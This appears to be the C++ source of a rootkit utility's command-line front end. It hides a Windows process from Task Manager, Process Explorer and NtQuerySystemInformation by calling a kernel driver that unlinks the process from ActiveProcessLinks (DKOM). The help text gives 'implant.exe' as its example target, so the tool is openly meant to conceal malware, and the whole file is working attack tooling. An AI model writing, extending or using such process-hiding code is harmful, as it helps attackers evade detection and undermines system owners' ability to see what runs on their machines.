#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <string>
#include "../Memory/DriverInterface/driver_interface.hpp"

static std::wstring to_wide( const char* s )
{
	std::wstring ws;
	while( *s ) ws += static_cast< wchar_t >( *s++ );
	return ws;
}

void print_help( const char* prog )
{
	printf( "%s - Hide a process from Task Manager via DKOM.\n", prog );
	printf( "\n" );
	printf( "Description:\n" );
	printf( "  Unlinks a process from the kernel's ActiveProcessLinks list using\n" );
	printf( "  Direct Kernel Object Manipulation (DKOM). After hiding, the process\n" );
	printf( "  will no longer appear in Task Manager, Process Explorer, or any tool\n" );
	printf( "  relying on NtQuerySystemInformation. The process continues to run.\n" );
	printf( "\n" );
	printf( "Usage:\n" );
	printf( "  %s <process_name>     Hide by process name\n", prog );
	printf( "  %s --pid <pid>        Hide by process ID\n", prog );
	printf( "  %s --help             Show this help\n", prog );
	printf( "\n" );
	printf( "Arguments:\n" );
	printf( "  process_name    Name of the process to hide (e.g. implant.exe)\n" );
	printf( "  --pid <pid>     Process ID to hide (decimal)\n" );
	printf( "\n" );
	printf( "Examples:\n" );
	printf( "  %s implant.exe\n", prog );
	printf( "  %s --pid 1337\n", prog );
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 )
	{
		print_help( argv[0] );
		return argc > 1 && ( strcmp( argv[1], "--help" ) == 0 || strcmp( argv[1], "-h" ) == 0 ) ? 0 : 1;
	}

	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		printf( "[!] Could not connect to the driver!\n" );
		return 1;
	}

	DWORD target_pid = 0;

	if( strcmp( argv[1], "--pid" ) == 0 )
	{
		if( argc < 3 )
		{
			printf( "[!] --pid requires a process ID argument.\n" );
			return 1;
		}

		target_pid = static_cast< DWORD >( strtoul( argv[2], nullptr, 10 ) );
	}
	else
	{
		const auto name = to_wide( argv[1] );

		if( !driver->attach( name ) )
		{
			printf( "[!] Could not find process '%s'!\n", argv[1] );
			return 1;
		}

		target_pid = driver->get_pid();
		printf( "[+] Found %s (PID: %u)\n", argv[1], target_pid );
	}

	if( driver->hide_process( target_pid ) )
		printf( "[+] PID %u hidden from Task Manager!\n", target_pid );
	else
	{
		printf( "[!] Failed to hide PID %u.\n", target_pid );
		return 1;
	}

	return 0;
}
